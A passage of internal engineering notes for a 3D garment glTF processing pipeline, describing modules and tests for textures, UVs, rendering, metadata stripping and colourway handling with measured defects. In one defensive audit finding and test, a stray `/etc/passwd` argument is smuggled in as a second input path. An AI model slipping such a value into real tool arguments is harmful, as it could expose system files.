exist." Found by the end-to-end wiring test, not by review. `finiteNumber` (L8, 2026-08-18): eight numeric flags were read as `Number(rest[++i])` — four had no fallback, four had `??` that could never help because `??` tests null/undefined and NOT NaN (`NaN ?? 0.0001` is NaN, verified in node); no isNaN/Number.isFinite guards existed anywhere in the package; `--uv-weight 0` is the NEGATIVE CONTROL the artwork eval uses to represent destroyed artwork, so zero must pass. `assertFlagsOnly` (M6): the container's comment claimed the flag filter stopped a malformed request smuggling a second input path — it did not (it filtered `typeof === 'string'`, while the parser treats any non-`--` token as the INPUT PATH; measured: appending `/etc/passwd` changed the input); never reachable in production because `shrinkFlagsFor` returns hardcoded literals chosen by a two-value enum — "THAT upstream fact is what made the container safe, not the filter the comment pointed at — which is exactly why the comment was dangerous."
- `overlay-annotate.ts` — Writes the overlay (z-fighting) decision INTO the asset as glTF material `extras.depthBias`. Why the asset and not the viewer: adjacency is a property of the geometry and the pipeline is the only place that can see it — model-viewer at runtime has a flat list of materials with no idea which panel any sits on; a viewer-side rule would have to guess from names, "which is the thing this repo has been burned by". ⚠️ THE BIN CHUNK IS COPIED BYTE FOR BYTE AND THAT IS DELIBERATE: re-serialising through @gltf-transform would re-encode EXT_meshopt_compression and re-quantize every vertex attribute — the root CLAUDE.md's first pipeline trap is "never run the pipeline on its own output"; `extras` and the material array live entirely in the JSON chunk and adding a material never moves a bufferView; `binIdentical` is asserted, not assumed. Overrides are keyed by MATERIAL NAME while the detector is not (geometric on purpose; a name is the escape hatch a person can read) and a stale override that matches nothing is REPORTED — "the failure mode `REFERENCE_PATHS` and `isArtworkMaterialByName` both had." ⚠️ `alphaModes` defaulted to `['OPAQUE']` until 2026-09-03 and that made the tool SILENT ON EVERY REAL EXPORT (audits CI-04, A-07, B-04, MAT-07): CLO's printed layers arrive as MASK after solidify and BLEND when soft, so the filter discarded every reading and the summary said "flagged 0" beside 112 readings that said overlay. ⚠️ THE COLOURWAY LOOP IS NOT OPTIONAL AND ITS ABSENCE IS A SHIPPED BUG IN THIS REPO: a primitive carries one base material plus one mapping per colourway and they are DIFFERENT materials (Minecut's graphic panel resolves to materials #3, #19, #32, #45, #58) — flagging only the base fixes one colourway of five, "exactly the shape of the 2026-08-27 decal fix that reached 6 of 26 decals". A material shared with a BODY primitive is CLONED (`__overlay` suffix) or biasing the overlay would drag the body forward too. Primitive order is asserted per primitive (the material name is re-checked against the detector's, so a reader change fails loudly — "'preserves' is exactly the kind of claim this repo has paid for assuming"). `threadIgnored` counted, not silently dropped: found the moment the alpha filter opened (2026-09-03) — AERO's flat BLEND topstitch ribbons read as 56 stacked layers at 0.26 mm and flooded the review list; thread is never a print. JSON padded with SPACES and BIN with ZEROES (zero-padded JSON parses in Node, rejected by some loaders). An override factor outside the band the viewer will obey throws.
- `placeholders.ts` (782 lines) — Seed assets for N001; the shapes exist so the system is demonstrable end-to-end, and the file is a catalogue of fixture-shaped-wrong lessons. ⚠️ Per-colourway `ink`: without it the fixture could not exhibit the colourway bug AND DID NOT — identical decal materials got `dedup()`-merged into ONE shared, eagerly-bound material (measured 2026-08-27: fixture 6 MASK decals / 6 eager / 0 lazy vs the live garment 26 / 6 / 20), so a viewer fix reaching only the ARRIVING colourway passed every test while four of five colourways flickered in production. Alpha deliberately 1 (effective alpha = factor.a × texel.a; a factor below 1 moves every artwork alpha measurement and can make MASK discard a whole material). ⚠️ FIVE colourways with production's slugs, changed 2026-08-31 — the count is the point: navy/black/crimson vs production's wine/blush/butter/lime/black meant `e2e/serve.mjs` mapped five slugs onto THREE variant ids (blush, butter, lime all → N001-CRIMSON) so a swap reaching the 4th or 5th variant was untestable — the exact shape of the 2026-08-27 bug — and FOUR OF THE FIVE POSTER URLS 404'd with nothing failing "because nothing asserted the poster loaded." ⚠️ `navy` is deliberately GONE: `a11y.spec.ts:163` visits `/n001/navy` precisely because it is NOT a real colourway — that is how it reaches the retired-colourway notice; re-adding it silently turns that test into a second scan of a healthy page. ⚠️ `butter` (#FDFDC8) is the near-white body the swatch's inset ring is drawn for — without a near-white colourway no test can exhibit that class of bug, "which shipped once already." ⚠️ EVERY `ink` must stay distinct or `dedup()` merges the decals and the lazy `KHR_materials_variants` path — the one production uses — stops being exercised at all. Decal SVG deliberately high-contrast and saturated (that is what lossy WebP's 4:2:0 chroma bleeds) on a SECOND UV set (where CLO's "Apply Graphic" puts prints and where decimation used to protect nothing). FIVE artwork materials with the measured alpha proportions — until 2026-08-05 each colourway had exactly one clean binary cutout, so "the shape that actually broke production — `THE EXTRA MILE (Slogan)`, 3.58% mid, classified `graded` — existed nowhere in the seeded chain, and the gate that blocks five BLEND materials had never once been exercised against five of anything. That is the repo's recurring failure: the fixture could not exhibit the production shape." Aspect ratios kept because `isArtworkTexture` uses aspect ≥ 3 as one of three signals (the Slogan is 16:1 — squaring it would quietly weaken the fixture); the 0.00%-transparent `Zipper 3_TapeFabric` entry exists so `CUTOUT_MIN_TRANSPARENT` has a material to reject. Pattern-space UVs since 2026-09-03 (measured skinsuit panel −137..164, bib −206..206, transform scale ~0.015; before, every face mapped to the unit square so the quantizer took every UV set and "if production compresses, seed compressed"). Weave 4608² (past the 4096 cap so `--max-texture` has something to do), normal 2304² (past the 2048 data cap); ⚠️ the weave is COARSE on purpose — the fold pass judges "constant" on a 256-px thumbnail and a 4-px checker averages to one flat grey there (measured 2026-09-03: "the fold quietly removed the fixture's weave and every texture-cap assertion went blind"). Six prints SPREAD over the garment since 2026-09-03: until then all six were stacked 0.5 mm apart on the chest, so the front print hid the other five and destroying any of them changed no render. Boxes carry TEXCOORD_0 or the simplifier's attribute-aware path bails on every primitive and `--uv-weight` is silently inert — "exactly the failure the seeded fixtures used to hide". 1,200-triangle `Topstitch_1` band so `--stitch` has something to bind. Primitive order identical across colourways = "exactly the property real CLO exports must have for variant merging." Posters transparent and caption-free since 2026-09-03 (the viewer paints this photo over its own stage while the model downloads; the page prints the code itself).
- `posters.ts` — Posters rendered the way the viewer will show them. WHY this exists: the five live skinsuit posters were captured by a paid browser job deleted 2026-08-17 — they carry the retired caption "[ N001 / WINE ]", the black one is a flat placeholder silhouette, and nothing ever checked a poster against the product. This is the local, free replacement: every colourway from the front under the PRODUCTION lighting the render harness shares with the review server, transparent, no burned-in caption. Output names are exactly what `tools/asset-pipeline/scripts/og-cards.mjs` reads and the CMS expects for `colourways.posterPreview`. 1200×1500 (4:5), `POSTER_ORBIT` 0deg 80deg 105%, FOV 30deg = the viewer's own defaults. `renderPosters` fails loudly on a variant the file does not have, listing what it offers.
- `precision.ts` — How fine the finished file's position grid is against how close its prints sit to the cloth (GEO-05). The codec stores positions as 14-bit integers over each mesh's own box, so a vertex can only land on a grid: a 1.6 m garment has a ~0.1 mm step, while CLO places prints 0.1–0.3 mm in front of the cloth — when the grid step approaches the gap, print and cloth can quantize onto the SAME plane and flicker regardless of any depth nudge. Measured on the catalogue: grid 0.02–0.06 mm against a 0.100 mm gap — fine — but nothing said so, and a bigger garment or a coarser codec setting would have changed the answer silently. Read from the file (node's world scale = one integer step; 14 bits over −1..1 = 8191 steps/unit); `MIN_GAP_STEPS` 2 with an owner-facing sentence that names the CLO-side fix (0.2 mm) when under two steps, and is null when there is nothing to say.
- `raw-census.ts` — What arrived from CLO, measured before anything touches it (Rank 13). The report used to describe only what the pipeline DID; ten audit findings were about what it was GIVEN and every one was invisible from the report: 73% of a 1.54 GB upload was the same fabric picture exported once per colourway; textures far beyond any screen; a garment that was 46% thread by material name while the report said 0% because it only read mesh names (ARISAN: 46.55% by material, 0% by mesh — `Default Topstitch_3195` on a mesh called `Cloth_mesh`); cloth pieces with no weave map; prints whose finish and opacity differed from what the designer set on screen. "The owner can fix all of these in CLO — but only if the report says so, per garment, in their words." Runs FIRST in the chain, on the raw document; every measurement is a fact about the file, the warnings are advice and never a refusal — an export that trips all of them still produces a garment. `describeRawCensus`'s thread line reports BOTH what the file holds and what the `--stitch` dial actually matched this run (GEO-04: the dial matched nothing and said nothing; now, material-thread >5% with zero meshes matched says "this thread … took the garment budget").
- `render.ts` (486 lines) — Headless render harness. WHY: the first real garment's artwork came out damaged and the pipeline had no way to show anyone — "presets were tuned against file size alone, which is how a setting that protects logos less got shipped as 'Smallest file'". It renders through `<model-viewer>`, not a bespoke three.js scene, because the failure is defined as "what the customer sees on viewer.wear-run.help" — a different renderer would answer a different question. Lighting is a switch since 2026-09-02: `production` (soft studio HDR, neutral tone-mapping) so a contact sheet shows the product; `diagnostic` (flat, shadows off) because specular highlights move when geometry changes, so a lit A/B diff lights up everywhere — the artwork evals run in it and their ceilings were calibrated in it. The instruments (adaptive near plane + decal depth bias, re-applied per colourway exactly as apps/viewer does) are NOT a switch: until 2026-09-02 the harness carried neither, so it reported 0.00% for a fix that moves 1.8% of the picture (HR-2) and resolved depth 183× more coarsely than the product, inventing sparkle no customer sees (HR-3); `instruments: false` exists ONLY as the negative control. ⚠️ Orbit radius is CLAMPED on both sides and only one side is freed: probe measured 2026-09-02 that every request below ~54% of the framed radius settles on the SAME 1.0134 m (`min-camera-orbit` radius `auto`) — so `raw/CANONICAL.json`'s calibrated views that say "0.445m" have never used that radius and their zoom comes entirely from fieldOfView; the clamp is deliberately LEFT IN PLACE because freeing it would silently re-frame every calibrated crop (the far side IS freed — 60%..500% now render distinct frames where 105%..500% used to be one hash). ⚠️ ANYTHING UNDER 12° WAS SILENTLY IGNORED UNTIL 2026-08-08 (`min-field-of-view` defaults to 12deg): measured on the real N001 baseline, 1.4°/2°/3.1°/4.5° produced four BYTE-IDENTICAL PNGs; the element now carries `min-field-of-view="1deg"`. Same trap as orbit radius — the renderer overrides what you asked for and returns a perfectly plausible frame. CANONICAL.json's claim that fieldOfView "is the zoom control" was true only above the floor, and N001's single view is 14°, so the one calibrated garment could never have exposed it; below the floor a fingerprint records a zoom the renderer never used. Consequence for artwork coverage: CLAUDE.md lists `TEAM WEAR FRONT LABEL` (0.039 m) and the zip strips as "NOT COVERED", reading as a scoping choice — "It was not: at 12° minimum they could not be framed tightly enough to measure. A print smaller than roughly a hand was unguardable by construction." ⚠️ `CHROME_SUPPRESSION`: model-viewer paints a 5px progress bar and a screenshot can catch it — measured 2026-09-08 on 4.3.1, it captures as alpha 102 across the whole top edge exactly 5 rows deep, which is posters.test.ts's "expected 102 to be +0". It is a RACE, not a constant (the bar hides only via wall-clock CSS transitions applied from a rAF that CI's concurrent swiftshader browsers starve), which is why it looked like a flaky test — 8 of 8 concurrent `renderPosters` runs came back with the band, 0 of 8 after the fix; suppress rather than wait (chrome, not the garment; a wait would still race the rAF and add ~1.3 s to each of 25+ posters — "Removing the cause cannot be raced"); BOTH properties on purpose so a future rename still leaves a clean frame; "Do NOT copy this to `review-server.ts` — that page is interactive and a human loading a 27 MB garment there wants the progress bar." Screenshots are taken off the ELEMENT, not via `toDataURL()` (three.js runs `preserveDrawingBuffer: false`, so readback comes back fully transparent — measured, all four channels zero). A `--variant` waits for `variant-applied`, not merely the assignment (model-viewer applies variants asynchronously; rendering straight after could capture the default colourway under the new name). `flatViews`: a flat frame diffs as 0.00% against another flat frame — "which is how three ARISAN macro crops scored a perfect match on 2026-09-02 while showing nothing." `viewerAssetMap` extracted 2026-08-26 so the harness and review server cannot drift (same model-viewer build, pinned to the same version as apps/viewer, all three decoder families — a different decoder is a different renderer; note `--draco` DOES NOT LOAD on the deployed viewer and production stays on `--meshopt`, but a local file may carry it and failing to load one here looks exactly like a broken garment). The page sets Meshopt decoder location before any model loads — without it every production GLB fails "setMeshoptDecoder must be called before loading compressed files", "precisely the bug that made the first real garment render as an empty stage"; all decoders self-hosted so the harness never depends on a CDN.
- `repair-dead-textures.ts` — Makes a CLO export readable when it declares a texture that points at no image. THE DEFECT measured 2026-08-27 across all 28 raws: **six carry exactly one texture entry with no `source`** (`{"name":"Texture","sampler":0}`, CLO's default placeholder) and in every one `textures === images + 1` (table in-file: ARISAN 133/132, CAPSULE 115/114, KINETIC 87/86, Minecut 125/124, STRUCTURE 34/33, TERRA 90/89). The reader dereferences it and dies on `setMagFilter` null in **17 ms**, before any transform runs — which is why no pipeline stage can fix it and the repair has to happen on the bytes; the message names neither the garment nor the texture, so it reads as a pipeline bug and is not one. ⚠️ IT IS NOT AN ORPHAN — assuming so would have been wrong: every one is REFERENCED by 1–50 materials; what makes removal safe was measured narrowly — the only slot it ever fills is `metallicRoughnessTexture`, never `baseColorTexture`, and every material using it already declares `metallicFactor: 0`, so dropping the reference changes the render by nothing. ⚠️ The REFERENCES are removed, NEVER the texture entries — deleting `textures[5]` would renumber every later index so a material pointing at 6 would silently acquire the picture from 7: a wrong-artwork bug across the whole garment; `prune()` drops the now-unreferenced entry later. ⚠️ The JSON chunk is padded back to its ORIGINAL BYTE LENGTH (a shorter chunk would move the BIN and invalidate every buffer offset; trailing spaces are valid JSON whitespace; on a 601 MB export nothing is rewritten but the header; it throws if the encoded JSON ever grew — "asserted rather than assumed, because silently moving the BIN chunk would corrupt every accessor"). Verified on all six before any of this was written: each reads, and each yields the material count recorded in `docs/GARMENT-CATALOGUE-BASELINE.md` — 168, 101, 83, 128, 32, 141. `scanForDeadTextures` reads header + JSON chunk only (the 1.25 GB Cycling Bib costs the same as the 5 MB PRO-PILE and never enters memory whole; 22 of 28 are healthy and must not pay for a defect six have) and deliberately runs the REAL strip against a throwaway parse rather than a second "does it look broken?" predicate — "Two implementations of the same question drift, and the one that drifts silently here is the one that decides whether a garment can be processed at all."
- `review-server.ts` (522 lines) — Serve every GLB in a directory in a live `<model-viewer>`, for judging garments. Owner requirement 2026-08-26: *"Provide all the models in a local live 3d viewer so I can test them."* A still frame cannot show what turning a garment shows — a print that reads correctly head-on can be wrong at 40°, a metallic fabric only announces itself when the light moves; `render.ts` still produces contact sheets because a diff needs the same frame twice — "this is where a human decides." ⚠️ IT MUST BE THE RENDERER PRODUCTION USES, OR IT ANSWERS A DIFFERENT QUESTION: everything static comes from `viewerAssetMap()` shared with the render harness, and `@google/model-viewer` is pinned to the same version in `apps/viewer/package.json` and this package's. ⚠️ FOR PROCESSED OUTPUT FIRST, RAW EXPORTS SECOND — verified 2026-08-26 against the real catalogue: the 409.7 MB METRO-SHIELD SUIT loads and turns fine; the 1,253 MB Cycling Bib is a browser's whole memory budget in one request and has NOT been served (header read truncated at line 37).
- `strip-live-metadata.ts` (161 lines) — Remove root `extras` from an ALREADY-PROCESSED GLB, without re-rendering it. Why this exists separately from `stripRootExtras`: that transform fixes the pipeline so future garments ship clean, but it cannot help the eleven models already published — and re-running the pipeline on them is not an option: "Never run the pipeline on its own output" (meshopt has quantized the vertex attributes and `simplify-textured.ts` bails to a position-only fallback when it sees them, SILENTLY losing artwork protection), and re-processing from the raw exports would be eleven container jobs plus eleven manual admin attaches with any re-render able to change how a garment looks. So it rewrites the JSON chunk and nothing else — no decoder, no encoder, no decimator, no meshopt, geometry bytes copied verbatim. ⚠️ IT TRUNCATES RATHER THAN PADS and the reason is legibility rather than speed: `repair-dead-textures.ts` (the module this is modelled on) space-pads back to the original length, which is the safest possible edit but leaves the file the same size so "a later inspection cannot tell whether the strip ran"; the wire saving of truncating is close to zero anyway (434 KB of spaces gzips to almost nothing on Cloudflare) — what truncation buys is a file whose size states plainly that it happened. Offsets stay safe because accessor `byteOffset`s are relative to the BIN chunk, not the file.
- `strip-root-extras.ts` (107 lines) — Remove CLO's internal design database from the document root, and stamp ownership. ⚠️ EVERY LIVE GARMENT SHIPPED THIS UNTIL 2026-09-05, and no audit had found it: measured by ranged GET on all eleven published models — each carries a root `extras.MetaData` object, invisible on the page, read by no renderer, downloaded by everyone; 433.9 KB across the catalogue, and on `r-aj` it is 134,605 bytes, a third of that file's entire JSON chunk. Contents (quoted from the live `rxps`/`r-aj` files, real values deliberately NOT reproduced here — "this repository is public, and reproducing the leak in the module that exists to prevent it would be self-defeating"): **fabric physics** (Stretch-Warp, Bending-Weft, Shear, Density, FrictionCoefficient — four fabrics per garment; "A competitor loads these into their own CLO library and gets a garment that drapes identically"); **supplier fabric codes** as PBRMaterial names (`SUPPLIER_DOBBY_A`, `SUPPLIER_MFX_B`, `SUPPLIER_PSP_C`) while the public page says "88% Nylon / 12% Spandex"; **Coloro dye references** pointing at the physical colour specification; **pattern construction** (`SeamLinePairList`, 1,576 seams across the eleven, pairing panel indices to vertex runs — "That is how the garment is built"); **62 absolute Windows paths**, all `D:/New File/<GARMENT>/...`, including internal working names that differ from the published ones. "None of it is exploitable and none is visible to a visitor. It is a commercial…" (read truncated).
- `texture-fold.ts` (303 lines) — Phone graphics memory: fold what is constant, count what is left (fix plan Rank 10; audits TEX-04…TEX-07, F1-12, F2-05, LIVE-07). A picture is compressed on the wire and UNCOMPRESSED on the GPU: 4 bytes per pixel plus a third for mipmaps, whatever the file weighs — the live skinsuit's 2.4 MB of textures become 203 MB; the bib's 11.6 MB become 245 MB; the browser measured 255 MB and 317 MB uploaded before the customer touched anything, and iOS Safari drops the WebGL context past roughly 256 MB. Two of the skinsuit's textures were near-constant (a 2048² roughness map holding eight values, an 853×142 normal map that is one colour) and cost 22 MB for two numbers a material factor already expresses. FOLD, THEN COUNT, THEN SAY IT: a map whose every channel is constant within a measured band becomes the equivalent factor on each material that used it and is dropped; the post-encoding estimate is printed beside the file size, split by what the memory buys (artwork / fabric / shading maps); a garment over the phone budget gets a warning, never a silent publish. `CONSTANT_BAND` measured 2026-08-28 on the live skinsuit (audit TEX-06): roughness map t9 spans G 213–221 with stdev 0.80 and B 0–3 with stdev 0.48 — eight values in 4 million pixels.
- `textures.ts` (829 lines) — Texture inventory: dump every texture in a GLB to PNG, with a manifest saying where each one is used and what its alpha channel actually contains. WHY: the first real garment shipped with damaged artwork and nobody could say which pipeline stage did it, because the only way to look at a logo was to open the live site on a phone — "Every preset change so far has been made against file-size numbers alone." Two questions, answered without processing: (1) WHICH UV SET IS THE ARTWORK ON? Decimation used to weight TEXCOORD_0 and nothing else, so artwork on another set was decimated at zero weight while the fabric's UVs were protected — "damaged on some panels, clean on others, which is exactly the reported symptom"; ⚠️ read `materialsWithMultipleUvSets`, not "any texCoord != 0", for the alarm — `prune()` renumbers a lone second UV set down to TEXCOORD_0 before decimation ever sees it, so only materials sampling two or more sets actually carry the hazard into the simplifier. (2) DID THE ENCODER CRUSH IT? Lossy WebP is 4:2:0 chroma only, which bleeds hard saturated edges — the classic wordmark failure — and bytes-per-pixel (header read truncated at line 36). Exports `resolveBlendAlpha`/`profileAlpha` consumed by `optimize.ts`'s solidify step so gate and transform share one rule.
- `topstitch.ts` (141 lines) — Reduce decorative topstitch geometry on its own budget, leaving the garment alone. WHY: on 2026-08-21 a CLO export arrived at 1,313,979,936 bytes — 3.6× anything the pipeline had processed — and the split was not what anyone assumed: of its 33,964,432 triangles, `Cloth_mesh` (the ENTIRE visible garment, carrying all 116 artwork materials) was **11,128 — 0.03%**, while the other 21 meshes, all named `Topstitch_*`, held **99.97%**: three thousand triangles of thread for every one triangle of garment. Reachable only because CLO names stitching into separate meshes; measured on that file, stitch meshes carry five materials each (one per colourway) with flat `baseColor` and NO printed artwork — verified by walking mesh → primitive → material including the variant mappings, not assumed from the names — so thread can take an error budget orders of magnitude looser than the garment at zero risk to the prints, "which is exactly what the general-purpose decimator cannot express." ⚠️ TWO MISTAKES MADE THIS LOOK BROKEN THE FIRST TIME (frayed, spiky thread rejected on sight by the owner) and neither was the triangle count: (1) thread given `error: 0.01`, twenty times looser than the garment's 0.001 — "The budget, not the ratio, is what decides whether a stitch stays a cord or collapses int…" (read truncated).
- `uv-remap.ts` (417 lines) — Move every UV set into 0..1 so the quantizer will take it (fix plan Rank 11; audits CT-08, F1-10, GEO-01). THE DEFECT, MEASURED: `quantize()` (which `meshopt()` runs for us) refuses any TEXCOORD accessor outside 0..1 and says so only in a log line nobody reads (`Skipping TEXCOORD_0; out of [0,1] range`); CLO writes UVs in PATTERN space — a fabric panel spans −206..206 pattern units and a print is authored at u 0..1, v −1..0 with a `KHR_texture_transform` offset of (0,1) that flips it back. So on the 2026-09-03 masters **every one** of the skinsuit's 178 and the bib's 49 UV sets stayed a 32-bit float while positions were 16-bit and normals 8-bit: 1.15 MB of the skinsuit's 2.46 MB of geometry, 2.40 MB of the bib's 4.19 MB — the largest single thing in each file. Fix: for each group of pieces that must agree, take the union of their UV ranges, rewrite `q = (uv − min) / range` (inside 0..1 by construction) and fold the inverse into the material's `KHR_texture_transform`, composed with whatever CLO already put there (spec T·R·S) — every texel is sampled from exactly the same place, the only loss is the quantizer's, which is why `UV_QUANTIZE_BITS` is 16; gltfpack does the same by default and glTF-Transform's own tracker proposes it (issue #335).
- `validate.ts` (308 lines) — Warn when a production GLB is heavier than this — QR scans are mobile-first. ⚠️ `SIZE_WARNING_BYTES` here is DELIBERATELY A SECOND COPY of `packages/shared/src/media.ts`, not an import: this package is installed with plain `npm install` inside the shrink container's Docker image, where a `workspace:*` dependency cannot resolve. The copies are pinned equal by a drift test in validate.test.ts — the same arrangement `GLB_HARD_MAX_BYTES` already has at mediaRules.test.ts:94: "Two unpinned copies of a number the CMS enforces and the pipeline reports against is how a file passes `validate` and is then rejected on upload." Also flags uncompressed raster textures for re-encode and runs the Khronos spec check, artwork-alpha audit, crushed-artwork + UV-set summaries, and a sampled variant-colour read.
- `variant-colour.ts` (394 lines) — Read the actual colour of every `KHR_materials_variants` variant in a GLB. WHY: the owner typed colour names into the CMS by hand and mapped them by hand to whatever CLO called each variant — on 2026-08-03 production served a maroon garment labelled "Navy", a blush one "Black", a powder blue one "Crimson", with two colourways in the file never mapped and unreachable; "The file knew all five the whole time." WHAT IT DOES NOT DO: it never renames anything — the output is a *suggestion* carried alongside the verbatim variant id, "because a colourway slug is printed on physical QR tags and an automated process must never touch one." `VariantColour` extends `ColourName` with `variantId` verbatim ("Colorway 2"), `hex` of the dominant fabric, `sampledMaterial` "so a wrong answer is diagnosable", and `sampledFrom: 'factor' | 'texture'` (factor = CLO's colourway colour in `baseColorFactor`; texture = the factor was white and the fabric picture was sampled instead).
- `variant-texcoord.ts` (107 lines) — Re-point variant-only materials at UV sets their primitive actually has. THE DEFECT: `prune()` renumbers a primitive's UV attributes and updates only the material bound as the primitive's DEFAULT; it does not walk `KHR_materials_variants`, so a material reachable only through a colourway mapping keeps sampling `TEXCOORD_1` after that attribute has been renumbered away. Not merely a spec violation: the default colourway renders correctly and every OTHER colourway looks for a UV set that no longer exists, so its printed artwork draws with wrong or absent coordinates — "visible only after the visitor clicks a colour." ⚠️ THE SECOND TIME IN ONE DAY that variant-only materials were skipped by something that handles the eager one correctly — the other was the viewer's decal depth bias, which reached 6 of 26 decals for the same reason: "When a pass touches materials, ask what it does with the ones behind a variant." ⚠️ LATENT, NOT OBSERVED IN PRODUCTION — and said so rather than implied: measured 2026-08-27 across all 28 raw exports, **not one material samples a texCoord other than 0**, so no real garment can reach this today; it was found because placeholders.ts puts artwork on a second UV set deliberately and the Khronos validator reported 12 `MESH_PRIMITIVE_TOO_FEW_TEXCOORDS` errors the first ti… (read truncated).
- `viewer-page.ts` (434 lines) — The ONE page that both local `<model-viewer>` pages are built from — the headless render harness (render.ts) and the interactive review server (review-server.ts). WHY THEY SHARE IT: the 2026-09 audit found the two pages answering different questions about the same file — the review page carried production's lighting, adaptive near plane and decal depth bias while the harness carried none, so a contact sheet reported 0.00% for a fix the review page showed moving 1.8% of the picture (HR-2), and the harness resolved depth 183× more coarsely than the product, inventing sparkle no customer sees (HR-3); two copies had already drifted apart twice before that. "One source, two callers, is the only shape that cannot drift." ⚠️ THE SCRIPT BELOW MUST CONTAIN ZERO BACKTICKS — both callers embed it inside a template literal, a backtick in a comment ends the literal, and the resulting error names something else entirely (cost two cycles on 2026-08-29); pinned by viewer-page.test.ts. `DECAL_OFFSET_FACTOR` is held equal to `apps/viewer/src/lib/decal-depth-bias.ts`: ⚠️ WITHOUT IT, A LOCAL PAGE MISREPRESENTS THE PRODUCT — and the review page did, for a day: the viewer had biased printed cut-outs since 2026-08-27, the review page did not, so a garment judged there showed shattered artwork while the identical file rendered correctly to a customer, which read to the owner as "the depth bias did not work"; measured 2026-08-27 on `p001`, whose decals sit 0.001 mm… (read truncated).

### Tests (36 files + 2 type stubs — all read 2026-09-22)

- `pipeline.test.ts` — End-to-end merge/optimize/validate on seeded fixtures. ⚠️ Primitive count is DERIVED (`5 + PLACEHOLDER_ARTWORK.length`) not hard-coded "so growing the fixture does not mean hand-editing five assertions — the count is incidental; what these tests are about is ORDER." ⚠️ `writeTexturedGlb`'s UV span (120) and material name are LOAD-BEARING since 2026-08-27: it used to build a unit-square quad named `m` — the shape of a DECAL — so once artwork was detected geometrically, every texture it produced took the artwork budget and the maxTextureSize tests "stopped measuring what they claimed to"; real fabric median span is 294.81 vs artwork's 1.00 — "if production looks like that, seed that."
- `strategy.test.ts` — Family refinement. GEOMETRY and MIXED families byte-identical (MIXED is one file — Mantra Ray Proflex — "Nothing here is calibrated for it; do not guess."). ⚠️ "THE DESIGN DOCUMENT SAID TO DROP `--simplify` [for texture family], AND THAT WAS MEASURED WRONG": costs +0.0% on the dress (9,980 triangles) but +13% on X-MILO (1.77 M triangles despite 95% textures by size) — "Triangle count decides geometry; texture fraction decides textures." Asserts `--meshopt` not `--draco`; no bare positional (the /etc/passwd shape); never mutates the caller array; stable on re-run.
- `simplify-textured.test.ts` — Fixture is a planar grid with DELIBERATELY NON-LINEAR UVs: "a linearly-mapped plane keeps its texture perfectly under decimation … measured, all weights from 0 to 100 gave an identical 20 triangles" — a linear fixture cannot exhibit the defect. Carries the calibration table (uv weight × error → triangle counts) that "is the calibration reference for the detail levels in @run-apparel/shared."
- `texture-artwork.test.ts` — "Mis-reading fabric as artwork costs a few hundred KB; mis-reading artwork as fabric is the bug this module exists to fix, so the signals are deliberately generous and each is tested on its own." Cutout fixture = hard-edged mark on full transparency; wordmark identified by real aspect ratios (853×142, 1944×121 — 6:1 and 16:1 from the actual file).
- `pbr-normalize.test.ts` — ⚠️ "THE LOAD-BEARING NEGATIVE CONTROL": a material WITH `metallicRoughnessTexture` must be left alone — measured 2026-08-27 on X-MILO's 6835×5331 MR map, mean metalness 0.000, 100% non-metal — "Those 3,593 materials are correct, and counting them is what produced a false 'hundreds' figure." Roughness is only ever raised (METRO-SHIELD's 0.10 mirror → ≥0.5), hardware (`Zipper 1_Slider`) untouched, unclassified defaults to matte and reports by name (A-06).
- `overlay-depth.test.ts` — ⚠️ "EVERY NUMBER BELOW IS A MEASUREMENT, NOT AN INVENTION" — seven fixtures taken 2026-08-28 by running measureOverlays() over all 16 processed GLBs: "pinned here so that changing a threshold has to break a real garment before it can pass — the alternative is the shape this repo keeps paying for, a fixture that cannot exhibit the defect it guards." Constraint tests: the CLOTH under each print must NOT be biased ("both are OPAQUE, both in a stack… The only thing separating them from the print is which one is in front"), p001's body (34/66 ambiguous → confidence 0, not biased), topstitch/stopper (line contact), and too-far surfaces (topstitch 0.37–0.50 mm does not z-fight; real prints 0.05–0.30).
- `alpha-coverage.test.ts` — Thin stroke peaking at 110 vanishes entirely under MASK/0.5 while `findArtworkAlphaProblems` considers it correct. ⚠️ "A COARSE FIXTURE CANNOT SHOW THIS AND THE FIRST ONE HERE DID NOT": coverage is a step function — a 6-row stroke on 64 px steps in units of 1.6% and the target can fall between achievable values; real artwork has thousands of distinct edge values (Slogan is 3169×476), so a soft radial blob reproduces it. Boost is 1 (no-op) for hard cutouts, fully-opaque, fully-transparent (no div-by-zero); "NEVER shrinks alpha — deleting ink is the defect, adding it is not."
- `artwork-geometry.test.ts` — UV span is the signal (fabric median 294.81, p05 69.91 vs artwork 1.00 — "readable from the accessor's own min/max with no decode at all"). Finds artwork named `ZZ00000ZZZZ0`/`76197`/`01`/`ルン ろご。` — "on 8 of 28 garments NOTHING matched, so the printed artwork was compressed as if it were plain cloth." ⚠️ EXCLUDES topstitch by name: `Topstitch 1 Copy 1` measures exactly 1.000×1.000, the same span as the slogan, and 1,707 stitch primitives sit at median 0.83 — without the guard every one would get the artwork budget.
- `describe.test.ts` — ⚠️ Fixture GLBs are hand-built byte-for-byte, "DELIBERATELY NOT gltf-transform": its writer normalises JSON (fills `metallicFactor`, rewrites `asset.generator`, re-packs bufferViews) and "Every defect this module has to see is a shape CLO emits and gltf-transform would tidy away. This is the repo's own rule: if production emits it, seed it." Texture-heavy fixture mirrors `women athlatic dress` (335 MB of pictures, 9,980 triangles) with CLO's anonymous images — "Measured: 0 of 5,048."
- `gltf-spec.test.ts` — ⚠️ "THIS FAILED THE FIRST TIME IT RAN, AND THAT IS WHY THE CHECK EXISTS": every processed garment carried `IMAGE_NON_ENABLED_MIME_TYPE`+`TEXTURE_INVALID_IMAGE_MIME_TYPE` in pairs (p001 44 errors, arisan 38, n001 42, geovent 45) because the WebP pass wrote `image/webp` without declaring `EXT_texture_webp`; model-viewer sniffs the bytes and renders anyway, "so every gate in this repo was green while the output was invalid glTF that a stricter runtime is entitled to refuse." NEGATIVE CONTROL strips the extension back out and requires the errors to return. `SPEC_NOISE` drops codes every CLO export trips in bulk ("8 warnings and 32 hints … buries everything else. None indicates a defect."). The corruption edit keeps the JSON same-length-or-shorter "so the BIN chunk cannot move."
- `colour-name.test.ts` — Header IS the acceptance test: the five N001 live hexes read 2026-08-03 (Colorway 2 #502626 called "Navy" … two unmapped) — "If this module cannot name those five sensibly it is not worth shipping." Palette deliberately contains none of those hexes — "an earlier draft did, and every ΔE came out 0, proving only that a lookup can find a value it was handed." ⚠️ sRGB↔linear round-trip is "the single most likely bug in the whole feature… wrong but still plausible"; 0.214→~0.5 sentinel "otherwise every garment reads one shade darker"; ΔE symmetric, self-zero, ranks perceptually where RGB distance does not.
